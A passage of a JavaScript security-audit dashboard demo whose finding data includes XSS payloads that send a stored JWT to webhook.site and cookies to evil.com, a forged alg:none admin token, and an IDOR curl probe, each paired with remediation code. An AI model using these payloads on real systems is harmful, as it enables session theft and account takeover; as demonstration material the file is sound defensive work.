+    evaluatedHeaders: 'HTTP/1.1 200 OK\nContent-Type: text/html\nX-XSS-Protection: 0\n# Unfiltered HTML Body:\n<div class="preview-box"><svg/onload="fetch(\'https://webhook.site/steal?jwt=\'+localStorage.getItem(\'token\'))"></div>',
+    testPayload: '<!-- XSS Polyglot & SVG Exfiltration Vectors -->\n<svg/onload="fetch(\'https://webhook.site/steal?jwt=\'+localStorage.getItem(\'token\'))">\n<img src=x onerror="this.src=\'https://evil.com/k?k=\'+document.cookie">\njavascript:/*--></title></style></textarea><\\/script></xmp><svg/onload=alert(document.domain)>',
+    remediationLang: 'javascript',
+    remediationCode: '// Pure Client & Server-Side DOMPurify Sanitation\nimport DOMPurify from \'dompurify\';\n\n// SECURE: Strict Hook Sanitization Before DOM Injection\nfunction renderUserContent(dirtyHtml, targetElement) {\n  const cleanHtml = DOMPurify.sanitize(dirtyHtml, {\n    ALLOWED_TAGS: [\'b\', \'i\', \'em\', \'strong\', \'a\', \'p\', \'ul\', \'li\', \'code\', \'pre\'],\n    ALLOWED_ATTR: [\'href\', \'target\', \'class\'],\n    FORBID_TAGS: [\'script\', \'style\', \'iframe\', \'svg\', \'math\', \'object\', \'embed\'],\n    FORBID_ATTR: [\'onerror\', \'onload\', \'onclick\', \'onmouseover\']\n  });\n  targetElement.innerHTML = cleanHtml;\n}'
+  },
+  {
+    id: 'jwt_audit',
+    emoji: '🔑',
+    title: 'Session & JWT Integrity Verification',
+    category: 'Authentication Tokens & Cryptographic Verification',
+    initialStatus: 'critical',
+    pointWeight: 15,
+    initialPoints: 6,
+    cvssScore: 9.1,
+    severity: 'CRITICAL',
+    cve: 'CVE-2022-21449',
+    cwe: 'CWE-287',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
+    affectedEndpoint: 'POST /api/v1/auth/verify-session',
+    flaws: [
+      'JWT token validator accepts algorithm "alg": "none" header, permitting unsigned forged tokens.',
+      'Session cookies lack SameSite=Strict and HttpOnly flags, exposing auth tokens to JS access.',
+      'Token expiration ("exp") claim is bypassed when parsing refresh token structures.'
+    ],
+    evaluatedHeaders: 'HTTP/1.1 200 OK\nSet-Cookie: session_id=s_981298; Path=/; Domain=.cyber-core.internal\n# [VULNERABILITY]: Missing HttpOnly\n# [VULNERABILITY]: Missing SameSite=Strict\n# [VULNERABILITY]: Missing Secure Flag',
+    testPayload: '// Forged Admin Token with Alg: none\n// Header: { "alg": "none", "typ": "JWT" }\n// Payload:\n{\n  "sub": "usr_998822",\n  "email": "attacker@cyber-ops.io",\n  "role": "SUPER_ADMIN",\n  "permissions": ["*"],\n  "iat": 1724097600,\n  "exp": 1755633600\n}\n// Signature: (empty)',
+    remediationLang: 'typescript',
+    remediationCode: '// Secure JWT Verification with RS256 Whitelist\nimport jwt from \'jsonwebtoken\';\n\nexport function verifySessionToken(token: string): SessionPayload {\n  return jwt.verify(token, process.env.JWT_PUBLIC_KEY!, {\n    algorithms: [\'RS256\'], // Strictly rejects \'none\' & symmetric HS256 key confusion attacks\n    issuer: \'https://auth.cyber-core.internal\',\n    audience: \'https://api.cyber-core.internal\',\n    clockTolerance: 5\n  }) as SessionPayload;\n}'
+  },
+  {
+    id: 'rbac_audit',
+    emoji: '📋',
+    title: 'RBAC & Endpoint Access Matrix',
+    category: 'Broken Object Level Auth (BOLA) & Rate Limiting',
+    initialStatus: 'high',
+    pointWeight: 10,
+    initialPoints: 6,
+    cvssScore: 8.5,
+    severity: 'HIGH',
+    cve: 'CVE-2023-22515',
+    cwe: 'CWE-639',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L',
+    affectedEndpoint: 'GET /api/v1/organizations/{org_id}/invoices',
+    flaws: [
+      'BOLA / IDOR: Authenticated user from Tenant Org 102 can read private invoices of Org 101 via URL manipulation.',
+      'Missing API rate limiter allows 10,000 requests/minute with zero 429 throttling.',
+      'Missing vertical privilege validation on administrative system endpoint /api/v1/system/audit-dump.'
+    ],
+    evaluatedHeaders: 'HTTP/1.1 200 OK\nContent-Type: application/json\nX-RateLimit-Limit: unlimited\nX-RateLimit-Remaining: unlimited\n\n{\n  "tenant_id": 101,\n  "organization": "Acme Global Banking Corp",\n  "total_revenue_usd": 48920100.00,\n  "internal_bank_accounts": ["US89-BANK-9988-1200"]\n}',
+    testPayload: '# IDOR Multi-Tenant Extraction Probe\ncurl -X GET "https://api.cyber-core.internal/api/v1/organizations/101/invoices" \\\n     -H "Authorization: Bearer <USER_TOKEN_ORG_102>"',
+    remediationLang: 'go',
+    remediationCode: '// Go RBAC & Tenant Boundary Guard Middleware\nfunc RequireOrgAccess(next http.HandlerFunc) http.HandlerFunc {\n    return func(w http.ResponseWriter, r *http.Request) {\n        userCtx := GetUserFromContext(r.Context())\n        targetOrgID := chi.URLParam(r, "org_id")\n\n        // Enforce strict tenant boundary check\n        if userCtx.OrgID != targetOrgID && !userCtx.HasGlobalPermission("audit:read_all") {\n            http.Error(w, `{"error":"FORBIDDEN_TENANT_ISOLATION_VIOLATION"}`, http.StatusForbidden)\n            return\n        }\n        next(w, r)\n    }\n}'
+  }
+];
+
+// ==========================================
+// 2. GLOBAL STATE & CONTROLLERS
+// ==========================================
+
+class AuditStateManager {
+  constructor() {
+    this.nodes = JSON.parse(JSON.stringify(AUDIT_NODES_DATA));
+    this.isAuditing = false;
+    this.auditComplete = false;
+    this.currentAuditIndex = -1;
+    this.currentScore = 0;
+    this.targetScore = 0;
+    this.rafHandle = null;
+    this.stepMode = false;
+    this.activeFilter = 'all';
+    this.searchQuery = '';
+    this.patchedNodeIds = new Set();
+    this.selectedNodeId = null;
+  }
+
+  reset() {
+    this.nodes = JSON.parse(JSON.stringify(AUDIT_NODES_DATA));
+    this.isAuditing = false;
+    this.auditComplete = false;
+    this.currentAuditIndex = -1;
+    this.currentScore = 0;
+    this.targetScore = 0;
+    this.stepMode = false;
+    this.patchedNodeIds.clear();
+    this.selectedNodeId = null;
+  }
+
+  isNodePatched(nodeId) {
+    return this.patchedNodeIds.has(nodeId);
+  }
+
+  patchNode(nodeId) {
+    this.patchedNodeIds.add(nodeId);
+    this.recalculateScore();
+  }
+
+  unpatchNode(nodeId) {
+    this.patchedNodeIds.delete(nodeId);
+    this.recalculateScore();
+  }
+
+  calculateTotalScore() {
+    if (!this.auditComplete && this.currentAuditIndex < 0) return 0;
+    let score = 0;
+    for (const node of this.nodes) {
+      if (this.patchedNodeIds.has(node.id)) {
+        score += node.pointWeight;
+      } else if (this.auditComplete || this.nodes.indexOf(node) <= this.currentAuditIndex) {
+        score += node.initialPoints;
+      }
+    }
+    return Math.min(100, Math.max(0, score));
+  }
+
+  recalculateScore() {
+    this.targetScore = this.calculateTotalScore();
+    gaugeController.animateTo(this.targetScore);
+    uiController.updateMetricCards();
+    uiController.renderTable();
+    uiController.updateStepperUI();
+  }
+}
+
+const state = new AuditStateManager();
+
+// ==========================================
+// 3. LOGGER CONTROLLER
+// ==========================================
+
+class TerminalLogger {
+  constructor() {
+    this.body = document.getElementById('terminalBody');
+    this.countEl = document.getElementById('terminalLineCount');
+    this.isCollapsed = false;
+  }
+
+  log(msg, type = 'info', source = 'AUDIT_ENGINE') {
+    const timestamp = new Date().toISOString().substring(11, 19);
+    const line = document.createElement('div');
+    line.className = 'log-line';
+
+    let msgClass = 'log-msg-info';
+    if (type === 'warn') msgClass = 'log-msg-warn';
+    if (type === 'crit') msgClass = 'log-msg-crit';
+    if (type === 'pass') msgClass = 'log-msg-pass';
+    if (type === 'patch') msgClass = 'log-msg-patch';
+
+    line.innerHTML = `
+      <span class="log-time">[${timestamp}]</span>
+      <span class="log-source">[${source}]</span>
+      <span class="${msgClass}">${msg}</span>
+    `;
+
+    this.body.appendChild(line);
+
+    while (this.body.children.length > 200) {
+      this.body.removeChild(this.body.firstChild);
+    }
+
+    this.countEl.textContent = `${this.body.children.length} entries`;
+    this.body.scrollTop = this.body.scrollHeight;
+  }
+
+  clear() {
+    this.body.innerHTML = '';
+    this.countEl.textContent = '0 entries';
+    this.log('Terminal log stream cleared.', 'info', 'SYSTEM');
+  }
+
+  toggleCollapse() {
+    this.isCollapsed = !this.isCollapsed;
+    this.body.classList.toggle('collapsed', this.isCollapsed);
+    document.getElementById('terminalToggleIcon').textContent = this.isCollapsed ? '▲' : '▼';
+  }
+}
+
+const logger = new TerminalLogger();
+
+// ==========================================
+// 4. SVG SCORE GAUGE & GRADE CALCULATOR
+// ==========================================
+
+class GaugeController {
+  constructor() {
+    this.progressCircle = document.getElementById('gaugeProgressCircle');
+    this.scoreNumber = document.getElementById('gaugeScoreNumber');
+    this.gradeBadge = document.getElementById('gaugeGradeBadge');
+    this.postureLabel = document.getElementById('gaugePostureLabel');
+    this.circumference = 351.858; // 2 * pi * 56
+    this.currentScore = 0;
+    this.targetScore = 0;
+    this.animating = false;
+  }
+
+  getGrade(score) {
+    if (score >= 95) return { grade: 'A+', text: 'HARDENED / EXCELLENT', color: '#10b981', badgeClass: 'badge-passed' };
+    if (score >= 85) return { grade: 'A', text: 'SECURE / ROBUST', color: '#06b6d4', badgeClass: 'badge-low' };
+    if (score >= 70) return { grade: 'B', text: 'ACCEPTABLE / MODERATE', color: '#f59e0b', badgeClass: 'badge-medium' };
+    if (score >= 50) return { grade: 'C', text: 'ELEVATED RISK', color: '#f97316', badgeClass: 'badge-high' };
+    return { grade: 'F', text: 'CRITICAL EXPOSURE', color: '#ef4444', badgeClass: 'badge-critical' };
+  }
+
+  animateTo(newTarget) {
+    this.targetScore = newTarget;
+    if (this.animating) return;
+    this.animating = true;
+
+    const startVal = this.currentScore;
+    const duration = 750;
+    const startTime = performance.now();
+
+    const frame = (time) => {
+      const elapsed = time - startTime;
+      const progress = Math.min(1, elapsed / duration);
+      // Exponential decay easing
+      const eased = 1 - Math.pow(2, -10 * progress);
+      const val = Math.round(startVal + (this.targetScore - startVal) * eased);
+      this.renderValue(val);
+
+      if (progress < 1) {
+        requestAnimationFrame(frame);
+      } else {
+        this.currentScore = this.targetScore;
+        this.renderValue(this.targetScore);
+        this.animating = false;
+      }
+    };
+
+    requestAnimationFrame(frame);
+  }
+
+  renderValue(score) {
+    if (!state.auditComplete && state.currentAuditIndex < 0 && score === 0) {
+      this.scoreNumber.textContent = '--';
+      this.gradeBadge.textContent = 'GRADE --';
+      this.gradeBadge.style.color = 'var(--text-muted)';
+      this.gradeBadge.style.borderColor = 'var(--border-subtle)';
+      this.gradeBadge.style.background = 'rgba(255,255,255,0.05)';
+      this.postureLabel.textContent = 'AWAITING AUDIT RUN';
+      this.progressCircle.style.strokeDashoffset = this.circumference;
+      this.progressCircle.style.stroke = 'rgba(255,255,255,0.1)';
+      return;
+    }
+
+    const { grade, text, color } = this.getGrade(score);
+    this.scoreNumber.textContent = score;
+    this.gradeBadge.textContent = `GRADE ${grade}`;
+    this.gradeBadge.style.color = color;
+    this.gradeBadge.style.borderColor = color;
+    this.gradeBadge.style.background = `${color}22`;
+    this.postureLabel.textContent = text;
+    this.postureLabel.style.color = color;
+
+    const offset = this.circumference * (1 - score / 100);
+    this.progressCircle.style.strokeDashoffset = offset;
+    this.progressCircle.style.stroke = color;
+    this.progressCircle.style.filter = `drop-shadow(0 0 10px ${color})`;
+  }
+}
+
+const gaugeController = new GaugeController();
+
+// ==========================================
+// 5. UI CONTROLLER & RENDERERS
+// ==========================================
+
+class UIController {
+  constructor() {
+    this.tableBody = document.getElementById('vulnTableBody');
+    this.trackFill = document.getElementById('stepperTrackFill');
+    this.stepperStatusBadge = document.getElementById('stepperStatusBadge');
+  }
+
+  init() {
+    this.renderTable();
+    this.updateStepperUI();
+    this.updateMetricCards();
+    this.bindEvents();
+    logger.log('CyberSec Sentinel v4.2 Diagnostic Core Initialized.', 'info', 'SYSTEM');
+    logger.log('Target loaded: api.cyber-core.internal (7 security domains registered).', 'info', 'TARGET');
+  }
+
+  bindEvents() {
+    // Stepper node clicks
+    document.querySelectorAll('.stepper-node').forEach(nodeEl => {
+      nodeEl.addEventListener('click', () => {
+        const nodeId = nodeEl.dataset.nodeId;
+        drawerController.open(nodeId);
+      });
+    });
+
+    // Filter pills
+    document.querySelectorAll('.filter-pill').forEach(pill => {
+      pill.addEventListener('click', () => {
+        document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
+        pill.classList.add('active');
+        state.activeFilter = pill.dataset.filter;
+        this.renderTable();
+      });
+    });
+
+    // Search input
+    document.getElementById('matrixSearchInput').addEventListener('input', (e) => {
+      state.searchQuery = e.target.value.toLowerCase().trim();
+      this.renderTable();
+    });
+
+    // Header buttons
+    document.getElementById('btnRunAudit').addEventListener('click', () => auditRunner.runFullAudit());
+    document.getElementById('btnStepAudit').addEventListener('click', () => auditRunner.stepAudit());
+    document.getElementById('btnFixAll').addEventListener('click', () => auditRunner.simulateFixAll());
+    document.getElementById('btnReset').addEventListener('click', () => auditRunner.resetAll());
+    document.getElementById('btnExportJson').addEventListener('click', () => reportManager.exportJson());
+    document.getElementById('btnExecSummary').addEventListener('click', () => summaryModal.open());
+
+    // Terminal header toggle & clear
+    document.getElementById('terminalHeaderToggle').addEventListener('click', () => logger.toggleCollapse());
+    document.getElementById('btnClearTerminal').addEventListener('click', () => logger.clear());
+  }
+
+  updateStepperUI() {
+    const nodes = document.querySelectorAll('.stepper-node');
+    nodes.forEach((nodeEl, idx) => {
+      const nodeId = nodeEl.dataset.nodeId;
+      const nodeData = state.nodes.find(n => n.id === nodeId);
+      const isPatched = state.isNodePatched(nodeId);
+      const tagEl = nodeEl.querySelector('.node-tag');
+
+      // Clear states
+      nodeEl.classList.remove('state-pending', 'state-active', 'state-critical', 'state-warning', 'state-passed', 'state-patched');
+
+      if (isPatched) {
+        nodeEl.classList.add('state-patched');
+        tagEl.textContent = 'PATCHED';
+      } else if (state.isAuditing && idx === state.currentAuditIndex) {
+        nodeEl.classList.add('state-active');
+        tagEl.textContent = 'AUDITING...';
+      } else if (state.auditComplete || idx <= state.currentAuditIndex) {
+        if (nodeData.initialStatus === 'critical') {
+          nodeEl.classList.add('state-critical');
+          tagEl.textContent = `CRIT / ${nodeData.cvssScore}`;
+        } else if (nodeData.initialStatus === 'warning') {
+          nodeEl.classList.add('state-warning');
+          tagEl.textContent = `WARN / ${nodeData.cvssScore}`;
+        } else {
+          nodeEl.classList.add('state-passed');
+          tagEl.textContent = 'PASS / 0 CVE';
+        }
+      } else {
+        nodeEl.classList.add('state-pending');
+        tagEl.textContent = 'STANDBY';
+      }
+    });
+
+    // Track Fill Progress
+    if (state.auditComplete) {
+      this.trackFill.style.width = '90%';
+      this.stepperStatusBadge.innerHTML = '<span style="color: var(--green-neon);">●</span> AUDIT COMPLETE • 7/7 NODES EVALUATED';
+    } else if (state.isAuditing) {
+      const pct = Math.round(((state.currentAuditIndex + 1) / 7) * 90);
+      this.trackFill.style.width = `${pct}%`;
+      this.stepperStatusBadge.innerHTML = `<span style="color: var(--cyan-cyber);">●</span> SCANNING NODE ${state.currentAuditIndex + 1} OF 7...`;
+    } else {
+      this.trackFill.style.width = '0%';
+      this.stepperStatusBadge.innerHTML = '<span>●</span> STANDBY / READY TO AUDIT';
+    }
+  }
+
+  updateMetricCards() {
+    const unpatchedFindings = state.nodes.filter(n => !state.isNodePatched(n.id));
+    const patchedCount = state.patchedNodeIds.size;
+    const isEvaluated = state.auditComplete || state.currentAuditIndex >= 0;
+
+    let critCount = 0;
+    let highCount = 0;
+    let maxCvss = 0;
+    let maxCvssId = 'None';
+
+    if (isEvaluated) {
+      unpatchedFindings.forEach(n => {
+        if (n.severity === 'CRITICAL') critCount++;
+        if (n.severity === 'HIGH') highCount++;
+        if (n.cvssScore > maxCvss) {
+          maxCvss = n.cvssScore;
+          maxCvssId = n.cve;
+        }
+      });
+    }
+
+    document.getElementById('statVulnCount').textContent = isEvaluated ? unpatchedFindings.length : 0;
+    document.getElementById('statCritCount').textContent = `${critCount} Critical`;
+    document.getElementById('statHighCount').textContent = `${highCount} High`;
+    document.getElementById('statPatchedCount').textContent = `${patchedCount} / 7`;
+
+    const pct = Math.round((patchedCount / 7) * 100);
+    document.getElementById('statPatchPercent').textContent = `${pct}% Remediated`;
+
+    document.getElementById('statMaxCvss').textContent = isEvaluated ? maxCvss.toFixed(1) : '0.0';
+    document.getElementById('statMaxCvssId').textContent = isEvaluated && maxCvss > 0 ? maxCvssId : 'Zero Criticals';
+
+    const complianceEl = document.getElementById('statCompliance');
+    const score = state.calculateTotalScore();
+    if (!isEvaluated) {
+      complianceEl.textContent = 'UNVERIFIED';
+      complianceEl.style.color = 'var(--text-muted)';
+    } else if (score >= 95) {
+      complianceEl.textContent = 'COMPLIANT (A+)';
+      complianceEl.style.color = 'var(--green-neon)';
+    } else if (score >= 70) {
+      complianceEl.textContent = 'CONDITIONAL (B)';
+      complianceEl.style.color = 'var(--amber-warn)';
+    } else {
+      complianceEl.textContent = 'NON-COMPLIANT';
+      complianceEl.style.color = 'var(--red-alert)';
+    }
+
+    // Filter counts update
+    document.getElementById('countAll').textContent = state.nodes.length;
+    document.getElementById('countCritical').textContent = state.nodes.filter(n => n.severity === 'CRITICAL' && !state.isNodePatched(n.id)).length;
+    document.getElementById('countHigh').textContent = state.nodes.filter(n => n.severity === 'HIGH' && !state.isNodePatched(n.id)).length;
+    document.getElementById('countMedium').textContent = state.nodes.filter(n => (n.severity === 'MEDIUM' || n.severity === 'LOW') && !state.isNodePatched(n.id)).length;
+    document.getElementById('countPatched').textContent = patchedCount;
+  }
+
+  renderTable() {
+    this.tableBody.innerHTML = '';
+    const query = state.searchQuery;
+    const filter = state.activeFilter;
+
+    let filtered = state.nodes.filter(node => {
+      const isPatched = state.isNodePatched(node.id);
+
+      // Filter tabs
+      if (filter === 'critical' && (node.severity !== 'CRITICAL' || isPatched)) return false;
+      if (filter === 'high' && (node.severity !== 'HIGH' || isPatched)) return false;
+      if (filter === 'medium' && ((node.severity !== 'MEDIUM' && node.severity !== 'LOW') || isPatched)) return false;
+      if (filter === 'patched' && !isPatched) return false;
+
+      // Text search
+      if (query) {
+        const textBlob = `${node.title} ${node.cve} ${node.cwe} ${node.affectedEndpoint} ${node.category} ${node.severity}`.toLowerCase();
+        if (!textBlob.includes(query)) return false;
+      }
+      return true;
+    });
+
+    if (filtered.length === 0) {
+      const emptyRow = document.createElement('tr');
+      emptyRow.innerHTML = `
+        <td colspan="6" style="text-align: center; padding: 36px; color: var(--text-muted);">
+          🔍 No security findings match filter "<strong>${filter}</strong>" or search query.
+        </td>
+      `;
+      this.tableBody.appendChild(emptyRow);
+      return;
+    }
+
+    filtered.forEach(node => {
+      const isPatched = state.isNodePatched(node.id);
+      const isEvaluated = state.auditComplete || state.nodes.indexOf(node) <= state.currentAuditIndex;
+
+      let badgeClass = 'badge-critical';
+      if (node.severity === 'HIGH') badgeClass = 'badge-high';
+      if (node.severity === 'MEDIUM') badgeClass = 'badge-medium';
+      if (node.severity === 'LOW') badgeClass = 'badge-low';
+      if (isPatched) badgeClass = 'badge-passed';
+
+      const row = document.createElement('tr');
+      row.id = `row-${node.id}`;
+      if (isPatched) row.className = 'row-patched';
+
+      row.innerHTML = `
+        <td>
+          <span class="severity-badge ${badgeClass}">
+            ${isPatched ? 'PATCHED' : node.severity}
+          </span>
+        </td>
+        <td>
+          <div style="display: flex; align-items: center; gap: 8px; font-weight: 600; color: #fff;">
+            <span>${node.emoji}</span>
+            <span>${node.title.split('&')[0]}</span>
+          </div>
+        </td>
+        <td>
+          <div class="vuln-name-cell">
+            <span class="vuln-title">${node.flaws[0]}</span>
+            <div class="vuln-meta">
+              <span class="cve-tag">${node.cve}</span>
+              <span>•</span>
+              <span>${node.cwe}</span>
+              <span>•</span>
+              <span style="color: var(--text-muted);">${node.affectedEndpoint}</span>
+            </div>
+          </div>
+        </td>
+        <td>
+          <span class="cvss-score" style="color: ${isPatched ? 'var(--green-neon)' : (node.cvssScore >= 9.0 ? 'var(--red-alert)' : 'var(--orange-risk)')}">
+            ${isPatched ? '0.0' : node.cvssScore.toFixed(1)}
+          </span>
+        </td>
+        <td>
+          ${isPatched 
+            ? '<span class="status-badge status-patched">✓ RESOLVED</span>' 
+            : (isEvaluated 
+                ? '<span class="status-badge status-vulnerable">⚡ VULNERABLE</span>' 
+                : '<span class="status-badge" style="color: var(--text-muted);">STANDBY</span>')
+          }
+        </td>
+        <td style="text-align: right;">
+          <div class="table-actions" style="justify-content: flex-end;">
+            <button class="btn btn-sm ${isPatched ? 'btn-secondary' : 'btn-emerald'}" onclick="auditRunner.togglePatch('${node.id}')">
+              ${isPatched ? '↺ Rollback' : '⚡ Simulate Fix'}
+            </button>
+            <button class="btn btn-secondary btn-sm" onclick="drawerController.open('${node.id}')" title="Inspect deep headers & CVE details">
+              🔍 Inspect
+            </button>
+          </div>
+        </td>
+      `;
+      this.tableBody.appendChild(row);
+    });
+  }
+
+  showToast(msg, type = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type === 'success' ? 'toast-success' : ''}`;
+    toast.innerHTML = `
+      <span>${type === 'success' ? '✓' : 'ℹ️'}</span>
+      <span>${msg}</span>
+    `;
+    container.appendChild(toast);
+
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      toast.style.transform = 'translateY(10px)';
+      toast.style.transition = 'all 0.3s ease';
+      setTimeout(() => toast.remove(), 300);
+    }, 3200);
+  }
+}
+
+const uiController = new UIController();
+
+// ==========================================
+// 6. AUDIT EXECUTION ENGINE
+// ==========================================
+
+class AuditRunner {
+  constructor() {
+    this.stepTimer = null;
+  }
+
+  async runFullAudit() {
+    if (state.isAuditing) return;
+    state.isAuditing = true;
+    state.auditComplete = false;
+    state.currentAuditIndex = 0;
+
+    document.getElementById('btnRunAudit').disabled = true;
+    logger.log('Starting full automated security scan (7 nodes)...', 'info', 'ENGINE');
+
+    for (let i = 0; i < state.nodes.length; i++) {
+      state.currentAuditIndex = i;
+      const node = state.nodes[i];
+      uiController.updateStepperUI();
+      uiController.renderTable();
+      uiController.updateMetricCards();
+
+      logger.log(`Scanning [${node.emoji} ${node.title}] against ${node.affectedEndpoint}...`, 'info', 'SCANNER');
+      await this.sleep(700);
+
+      const isPatched = state.isNodePatched(node.id);
+      if (isPatched) {
+        logger.log(`Node [${node.id}] passed (Simulated Patch Active).`, 'pass', 'ENGINE');
+      } else if (node.initialStatus === 'critical') {
+        logger.log(`DETECTED CRITICAL FLAW: ${node.cve} in [${node.id}] (CVSS ${node.cvssScore})`, 'crit', 'ENGINE');
+      } else if (node.initialStatus === 'warning') {
+        logger.log(`DETECTED WARNING: ${node.cve} in [${node.id}] (CVSS ${node.cvssScore})`, 'warn', 'ENGINE');
+      }
+
+      state.recalculateScore();
+    }
+
+    state.isAuditing = false;
+    state.auditComplete = true;
+    document.getElementById('btnRunAudit').disabled = false;
+    uiController.updateStepperUI();
+    uiController.renderTable();
+    uiController.updateMetricCards();
+    state.recalculateScore();
+
+    logger.log(`Full Audit Complete! Overall Security Score: ${state.calculateTotalScore()}/100.`, 'pass', 'ENGINE');
+    uiController.showToast(`Audit complete: ${state.calculateTotalScore()} / 100 pts`, 'info');
+  }
+
+  async stepAudit() {
+    if (state.isAuditing) {
+      // Pause
+      state.isAuditing = false;
+      logger.log('Audit sequence paused by operator.', 'warn', 'USER');
+      uiController.showToast('Audit paused', 'info');
+      return;
+    }
+
+    if (state.currentAuditIndex >= state.nodes.length - 1) {
+      state.currentAuditIndex = -1;
+      state.auditComplete = false;
+    }
+
+    state.currentAuditIndex++;
+    const node = state.nodes[state.currentAuditIndex];
+    logger.log(`Stepping to [${node.emoji} ${node.title}]...`, 'info', 'STEPPER');
+
+    uiController.updateStepperUI();
+    uiController.renderTable();
+    uiController.updateMetricCards();
+
+    await this.sleep(400);
+
+    if (state.currentAuditIndex === state.nodes.length - 1) {
+      state.auditComplete = true;
+      logger.log(`Audit fully completed on step 7. Score: ${state.calculateTotalScore()}/100.`, 'pass', 'ENGINE');
+    }
+
+    state.recalculateScore();
+  }
+
+  togglePatch(nodeId) {
+    const node = state.nodes.find(n => n.id === nodeId);
+    if (!node) return;
+
+    const wasPatched = state.isNodePatched(nodeId);
+    if (wasPatched) {
+      state.unpatchNode(nodeId);
+      logger.log(`Rollback: Reverted patch on [${node.cve}] (${node.title}). Score decreased.`, 'warn', 'PATCH_ENGINE');
+      uiController.showToast(`Reverted fix on ${node.cve}`, 'info');
+    } else {
+      state.patchNode(nodeId);
+      logger.log(`Neutralized ${node.cve} (${node.title})! Posture improved (+${node.pointWeight - node.initialPoints} pts).`, 'patch', 'PATCH_ENGINE');
+      uiController.showToast(`Patched ${node.cve} successfully!`, 'success');
+
+      // Animate row flash
+      setTimeout(() => {
+        const row = document.getElementById(`row-${nodeId}`);
+        if (row) row.classList.add('row-flash');
+      }, 50);
+    }
+
+    if (drawerController.isOpen && drawerController.currentNodeId === nodeId) {
+      drawerController.render(nodeId);
+    }
+  }
+
+  async simulateFixAll() {
+    logger.log('Initiating automated batch hardening & patch simulation...', 'patch', 'AUTO_PATCH');
+    const unpatched = state.nodes.filter(n => !state.isNodePatched(n.id));
+
+    if (unpatched.length === 0) {
+      uiController.showToast('All vulnerabilities are already patched!', 'info');
+      return;
+    }
+
+    for (const node of unpatched) {
+      state.patchNode(node.id);
+      logger.log(`[AUTO_PATCH] Applied hardening hotfix for ${node.cve} -> Status: SECURE.`, 'patch', 'AUTO_PATCH');
+      await this.sleep(180);
+    }
+
+    state.recalculateScore();
+    uiController.showToast('All 7 security vectors hardened (Score: 100 / Grade A+)', 'success');
+  }
+
+  resetAll() {
+    state.reset();
+    gaugeController.renderValue(0);
+    uiController.updateStepperUI();
+    uiController.renderTable();
+    uiController.updateMetricCards();
+    logger.log('Scanner state reset to clean baseline.', 'info', 'SYSTEM');
+    uiController.showToast('Scanner reset', 'info');
+  }
+
+  sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+}
+
+const auditRunner = new AuditRunner();
+
+// ==========================================
+// 7. TELEMETRY INSPECTION DRAWER CONTROLLER
+// ==========================================
+
+class DrawerController {
+  constructor() {
+    this.overlay = document.getElementById('drawerOverlay');
+    this.drawer = document.getElementById('inspectionDrawer');
+    this.emojiEl = document.getElementById('drawerEmoji');
+    this.titleEl = document.getElementById('drawerTitle');
+    this.categoryEl = document.getElementById('drawerCategory');
+    this.contentEl = document.getElementById('drawerContent');
+    this.statusTag = document.getElementById('drawerStatusTag');
+    this.patchBtn = document.getElementById('drawerPatchBtn');
+
+    this.isOpen = false;
+    this.currentNodeId = null;
+    this.activeTab = 'flaws';
+
+    this.bindEvents();
+  }
+
+  bindEvents() {
+    document.getElementById('drawerCloseBtn').addEventListener('click', () => this.close());
+    this.overlay.addEventListener('click', () => this.close());
+
+    // Drawer tabs
+    document.querySelectorAll('.drawer-tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        document.querySelectorAll('.drawer-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        this.activeTab = tab.dataset.drawerTab;
+        this.render(this.currentNodeId);
+      });
+    });
+
+    this.patchBtn.addEventListener('click', () => {
+      if (this.currentNodeId) {
+        auditRunner.togglePatch(this.currentNodeId);
+      }
+    });
+
+    window.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && this.isOpen) this.close();
+    });
+  }
+
+  open(nodeId) {
+    this.currentNodeId = nodeId;
+    this.isOpen = true;
+    this.render(nodeId);
+    this.overlay.classList.add('open');
+    this.drawer.classList.add('open');
+  }
+
+  close() {
+    this.isOpen = false;
+    this.overlay.classList.remove('open');
+    this.drawer.classList.remove('open');
+  }
+
+  render(nodeId) {
+    const node = state.nodes.find(n => n.id === nodeId);
+    if (!node) return;
+
+    const isPatched = state.isNodePatched(node.id);
+
+    this.emojiEl.textContent = node.emoji;
+    this.titleEl.textContent = node.title;
+    this.categoryEl.textContent = `${node.category} • ${node.affectedEndpoint}`;
+
+    if (isPatched) {
+      this.statusTag.className = 'status-badge status-patched';
+      this.statusTag.textContent = '✓ SECURE / PATCHED';
+      this.patchBtn.className = 'btn btn-secondary btn-sm';
+      this.patchBtn.textContent = '↺ Rollback Patch';
+    } else {
+      this.statusTag.className = 'status-badge status-vulnerable';
+      this.statusTag.textContent = `⚡ VULNERABLE (${node.severity})`;
+      this.patchBtn.className = 'btn btn-emerald btn-sm';
+      this.patchBtn.textContent = '⚡ Simulate Fix';
+    }
+
+    this.contentEl.innerHTML = '';
+
+    if (this.activeTab === 'flaws') {
+      const sec = document.createElement('div');
+      sec.className = 'drawer-section';
+      sec.innerHTML = `
+        <div class="drawer-section-title">
+          <span>Identified Vulnerabilities & CVE Vector</span>
+          <span style="color: var(--cyan-cyber); font-family: var(--font-mono);">${node.cve}</span>
+        </div>
+        <div style="margin-bottom: 14px; display: flex; gap: 8px; flex-wrap: wrap;">
+          <span class="severity-badge ${isPatched ? 'badge-passed' : 'badge-critical'}">${isPatched ? 'RESOLVED' : node.severity}</span>
+          <span class="severity-badge badge-low">CVSS Score: ${isPatched ? '0.0' : node.cvssScore}</span>
+          <span class="severity-badge badge-low">${node.cwe}</span>
+        </div>
+        <div style="font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-muted); margin-bottom: 14px; word-break: break-all;">
+          ${node.cvssVector}
+        </div>
+        <div style="font-size: 0.8rem; color: #cbd5e1;">
+          <strong style="color: #fff;">Diagnostic Findings:</strong>
+          <ul style="margin-top: 8px; padding-left: 18px; display: flex; flex-direction: column; gap: 6px;">
+            ${node.flaws.map(f => `<li>${f}</li>`).join('')}
+          </ul>
+        </div>
+      `;
+      this.contentEl.appendChild(sec);
